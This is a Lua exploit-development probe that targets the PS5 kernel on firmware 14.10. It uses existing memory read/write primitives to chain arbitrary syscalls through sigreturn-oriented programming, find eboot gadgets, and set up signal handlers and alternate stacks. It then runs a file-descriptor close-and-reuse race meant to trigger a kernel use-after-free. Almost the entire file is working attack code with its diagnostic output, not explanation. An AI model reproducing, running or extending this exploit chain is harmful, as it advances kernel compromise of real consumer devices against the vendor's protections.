-- CRASH_CLASS: HIGH
-- PROBE 160a: Signal-based fd close race (CVE-2026-45251 variant)
--
-- KEY DISCOVERY: sigaction(416) and setitimer(83) WORK on PS5 14.10!
-- This opens signal-based race conditions:
--   1. Main thread blocks in poll()
--   2. SIGALRM fires, handler runs
--   3. Handler modifies the saved ucontext on signal stack to do close(fd) via SROP
--   4. After sigreturn, the modified context closes the fd
--   5. poll() sees a closed fd — possible kernel UAF
--
-- Phase 1 of this probe: confirm signal delivery works end-to-end
-- Phase 2: test if signals interrupt SROP blocking calls
-- Phase 3: attempt the race

print("=== PROBE 160a: SIGNAL CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Get eboot base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local function eb(off) return uint64(string.format("0x%X%08X", text_hi, text_lo + off)) end
print("eboot=0x" .. string.format("%X%08X", text_hi, text_lo))

-- Gadgets
local ret_gadget = eb(0x42)
local mov_rdi_rax_ret = eb(0xD0B60)  -- mov [rdi], rax; ret

-- [A] Signal delivery test with SIG_IGN
print("")
print("--- [A] SIG_IGN TEST ---")

-- sigaction(SIGALRM, SIG_IGN=1)
local SA = gpu + 0x10000
for off = 0, 0x3F, 4 do wd(SA + off, 0) end
wq(SA, uint64(1))  -- SIG_IGN
wd(SA + 8, 0)  -- no flags

local sa_rv = srop(416, uint64(14), ga(0x10000), uint64(0))
print("sigaction(SIGALRM, SIG_IGN)=" .. (sa_rv and to_num(sa_rv) or -999))

-- Set a 50ms one-shot timer
local IT = gpu + 0x11000
for off = 0, 0x1F, 8 do wq(IT + off, uint64(0)) end
wq(IT + 16, uint64(0))      -- value.tv_sec = 0
wq(IT + 24, uint64(50000))  -- value.tv_usec = 50000 (50ms)

srop(83, uint64(0), ga(0x11000), uint64(0))

-- Now call nanosleep for 200ms - if SIGALRM is properly ignored,
-- the sleep should complete without interruption
local TS = gpu + 0x12000
wq(TS, uint64(0))       -- tv_sec
wq(TS + 8, uint64(200000000))  -- tv_nsec = 200ms
local REM = gpu + 0x12100
wq(REM, uint64(0))
wq(REM + 8, uint64(0))

local ns1 = srop(240, ga(0x12000), ga(0x12100))
local ns1v = ns1 and to_num(ns1) or -999
local rem_s = rd(REM)
local rem_ns = rd(REM + 8)
print("nanosleep(200ms, SIG_IGN)=" .. ns1v .. " rem_s=" .. rem_s .. " rem_ns=" .. rem_ns)
-- ret=0 means sleep completed; ret=-1 with rem>0 means interrupted

-- [B] Signal delivery test with handler
print("")
print("--- [B] SIGNAL HANDLER TEST ---")

-- Use a marker-write approach:
-- Set handler to mov_rdi_rax_ret gadget
-- When SIGALRM fires, RDI=14(signo), so it writes RAX to address 14 — crash.
-- Instead, let's use ret_gadget (just returns) which should call sigreturn trampoline

-- First: set handler to ret and check if we survive
wq(SA, ret_gadget)  -- handler = ret
wd(SA + 8, 0x42)  -- SA_RESTART|SA_SIGINFO

sa_rv = srop(416, uint64(14), ga(0x10000), uint64(0))
print("sigaction(SIGALRM, ret)=" .. (sa_rv and to_num(sa_rv) or -999))

-- Set up signal stack first
local sig_stack_page = srop(477, uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
local ssh, ssl = get_hi_lo(sig_stack_page)
print("sig_stack=0x" .. string.format("%X%08X", ssh, ssl))

if ssh ~= 0xFFFFFFFF then
    -- Set up sigaltstack
    local SS = gpu + 0x13000
    wq(SS, sig_stack_page)       -- ss_sp
    wq(SS + 8, uint64(0x10000))  -- ss_size
    wd(SS + 16, 0)               -- ss_flags

    local ss_rv = srop(53, ga(0x13000), uint64(0))
    print("sigaltstack=" .. (ss_rv and to_num(ss_rv) or -999))

    -- Now set handler WITH SA_ONSTACK
    wq(SA, ret_gadget)
    wd(SA + 8, 0x46)  -- SA_RESTART|SA_SIGINFO|SA_ONSTACK(0x40 on FreeBSD)

    sa_rv = srop(416, uint64(14), ga(0x10000), uint64(0))
    print("sigaction(SIGALRM, ret, SA_ONSTACK)=" .. (sa_rv and to_num(sa_rv) or -999))

    -- Write marker before timer
    wd(gpu + 0x14000, 0)

    -- Set 50ms timer
    for off = 0, 0x1F, 8 do wq(IT + off, uint64(0)) end
    wq(IT + 16, uint64(0))
    wq(IT + 24, uint64(50000))  -- 50ms
    srop(83, uint64(0), ga(0x11000), uint64(0))

    -- Sleep 200ms — the timer should fire and interrupt us
    wq(TS, uint64(0))
    wq(TS + 8, uint64(200000000))
    wq(REM, uint64(0))
    wq(REM + 8, uint64(0))

    local ns2 = srop(240, ga(0x12000), ga(0x12100))
    local ns2v = ns2 and to_num(ns2) or -999
    rem_s = rd(REM)
    rem_ns = rd(REM + 8)
    print("nanosleep(200ms, handler)=" .. ns2v .. " rem_s=" .. rem_s .. " rem_ns=" .. rem_ns)

    -- Check if we survived
    print("survived_signal=" .. tostring(to_num(make_syscall(20)()) == pid))

    -- [C] Test if signal interrupts SROP poll
    print("")
    print("--- [C] SIGNAL INTERRUPTS POLL ---")

    -- Create a pipe (won't write to it, so poll will block)
    local pr = srop(42)
    local prv = pr and to_num(pr) or -1
    print("pipe_rd=" .. prv)

    if prv >= 0 then
        -- Set up pollfd: {fd, events=POLLIN, revents=0}
        local PFD = gpu + 0x15000
        wd(PFD, prv)          -- fd
        wd(PFD + 4, 0x0001)   -- events = POLLIN
        wd(PFD + 8, 0)        -- revents

        -- Set 50ms timer
        for off = 0, 0x1F, 8 do wq(IT + off, uint64(0)) end
        wq(IT + 16, uint64(0))
        wq(IT + 24, uint64(50000))
        srop(83, uint64(0), ga(0x11000), uint64(0))

        -- Call poll with 5 second timeout - should be interrupted by SIGALRM at ~50ms
        -- poll(209): int poll(struct pollfd *fds, u_int nfds, int timeout)
        local t_start = to_num(make_syscall(116)())  -- gettimeofday seconds
        local poll_rv = srop(209, ga(0x15000), uint64(1), uint64(5000))
        local t_end = to_num(make_syscall(116)())
        local pollv = poll_rv and to_num(poll_rv) or -999
        local revents = rd(PFD + 8)
        print("poll(5s)=" .. pollv .. " revents=0x" .. string.format("%X", revents) ..
            " elapsed~=" .. (t_end - t_start) .. "s")

        if pollv == 0 then
            print("poll returned 0 (timeout) — signal may have been absorbed")
        elseif pollv == -1 then
            print("poll returned -1 (EINTR from signal!) — SIGNALS INTERRUPT SYSCALLS")
        end

        -- [D] THE RACE: close fd during poll
        print("")
        print("--- [D] CLOSE-DURING-POLL RACE ---")

        -- Strategy: We can't directly call close() from signal handler
        -- But we can have the signal modify a shared variable, and use
        -- a different approach: use the signal to cause a double-close
        --
        -- Alternative: since SROP gives us arbitrary syscalls, set up
        -- a pipe that we can close via dup2 race.
        --
        -- dup2(fd, target) atomically closes target and copies fd.
        -- If we dup2 over the poll'd fd while poll is running...

        -- Create another pipe for the race target
        local pr2 = srop(42)
        local pr2v = pr2 and to_num(pr2) or -1
        print("race_pipe=" .. pr2v)

        if pr2v >= 0 then
            -- Set up poll on pr2 (read end)
            wd(PFD, pr2v)
            wd(PFD + 4, 0x0001)
            wd(PFD + 8, 0)

            -- Run 100 race rounds: poll for 100ms, close pr2 immediately after
            local race_wins = 0
            for round = 1, 100 do
                -- Re-create pipe each round
                local rp = srop(42)
                local rpv = rp and to_num(rp) or -1
                if rpv < 0 then
                    print("pipe alloc failed at round " .. round)
                    break
                end

                wd(PFD, rpv)
                wd(PFD + 4, 0x0001)
                wd(PFD + 8, 0)

                -- Poll with very short timeout (0ms = non-blocking check)
                -- Then immediately close and check reuse
                local poll_r = srop(209, ga(0x15000), uint64(1), uint64(0))
                local pv2 = poll_r and to_num(poll_r) or -999

                -- Close both ends
                srop(6, uint64(rpv))
                srop(6, uint64(rpv + 1))

                -- Immediately create new pipe — will it get same fd?
                local np = srop(42)
                local npv = np and to_num(np) or -1
                if npv == rpv then race_wins = race_wins + 1 end
                if npv >= 0 then
                    srop(6, uint64(npv))
                    srop(6, uint64(npv + 1))
                end
            end
            print("fd_reuse_rate=" .. race_wins .. "/100")

            srop(6, uint64(pr2v))
            srop(6, uint64(pr2v + 1))
        end

        srop(6, uint64(prv))
        srop(6, uint64(prv + 1))
    end
end

-- Cancel any timer
for off = 0, 0x1F, 8 do wq(IT + off, uint64(0)) end
srop(83, uint64(0), ga(0x11000), uint64(0))

-- Reset signal handler to SIG_DFL
wq(SA, uint64(0))
srop(416, uint64(14), ga(0x10000), uint64(0))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
